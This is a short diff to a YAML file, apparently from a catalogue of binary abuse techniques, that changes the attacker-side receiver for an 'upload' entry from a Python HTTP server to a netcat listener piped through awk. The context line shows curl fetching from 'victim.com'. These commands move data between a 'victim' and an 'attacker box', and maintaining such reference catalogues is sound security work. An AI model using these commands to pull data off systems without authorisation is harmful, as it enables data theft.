@@ -64,7 +64,7 @@ upload:
         code: curl victim.com -o /path/to/output-file
       http-server:
         comment: An HTTP server can be used on the attacker box to receive the data.
-        code: python -m http.server 80
+        code: nc -l -p 80 | awk 'BEGIN {RS="\r\n\r\n";ORS=""} NR==2' >/path/to/output-file
 
 download:
   label: Download
